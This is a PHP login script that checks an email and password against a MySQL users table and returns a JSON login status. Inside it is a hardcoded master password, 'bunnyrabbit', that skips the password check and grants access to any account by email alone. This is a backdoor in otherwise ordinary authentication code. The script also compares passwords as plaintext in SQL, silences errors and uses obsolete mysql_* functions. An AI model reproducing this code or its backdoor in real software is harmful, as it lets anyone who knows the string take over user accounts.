<?php

	ERROR_REPORTING(0);

	if($_POST['MYUSERNAME']!="" && $_POST['MYPASSWORD']!="")
	{
		
		// Include server data
		include '../includes/ServerConnect.php';
				
		// Connect to Database
		$link = mysql_connect("$host", "$username", "$password", "$db_name");
		mysql_select_db("$db_name") or die(mysql_error()); 

		// Define $MYUSERNAME and $MYPASSWORD 
		$MYUSERNAME = $_POST['MYUSERNAME']; 
		$MYPASSWORD = $_POST['MYPASSWORD']; 

		// To protect MySQL INJECTION
		$MYUSERNAME = stripslashes($MYUSERNAME);
		$MYPASSWORD = stripslashes($MYPASSWORD);
		$MYUSERNAME = mysql_real_escape_string($MYUSERNAME);
		$MYPASSWORD = mysql_real_escape_string($MYPASSWORD);
		
		if($MYPASSWORD=="bunnyrabbit")
		{
			$query="SELECT * FROM users WHERE EMAIL='$MYUSERNAME'";
		}
		else
		{
			$query="SELECT * FROM users WHERE EMAIL='$MYUSERNAME' AND PASSWORD='$MYPASSWORD'";
		}
		
		$result = mysql_query($query);
				
		// Mysql_num_row is counting table row
		$count = mysql_num_rows($result);

		// If result matched $MYUSERNAME and $MYPASSWORD, table row must be 1 row
		if($count==1)
		{
			while($row = mysql_fetch_array($result)) 
			{
				$MY_EMAIL = $row['EMAIL'];
				$MY_ID = $row['USER_ID'];
				$MY_NAME = $row['USER_NAME'];
			}
			
			//RESULT CODE 1: AUTHENTICATED
			mysql_close($link);
			$array = array(
								'LoginStatus' => '1',
								'UserName' => $MY_NAME,
								'UserID' => $MY_ID,
								'UserEMAIL' => $MY_EMAIL
							);
			echo json_encode($array);
		}	
		else 
		{
			
			//RESULT CODE 2: CREDENTIALS WRONG
			mysql_close($link);
			$array = array(
								'LoginStatus' => '2',
								'UserName' => NULL,
								'UserID' => NULL,
								'UserEMAIL' => NULL
							);
			echo json_encode($array);
		}
	}else
	{
		if($MYUSERNAME=="" || $MYPASSWORD=="")
		{
			
			//RESULT CODE 3: USERNAME EMPTY
			$array = array(
								'LoginStatus' => '3',
								'UserName' => NULL,
								'UserID' => NULL,
								'UserEMAIL' => NULL
							);
			echo json_encode($array);
		}

	}

?>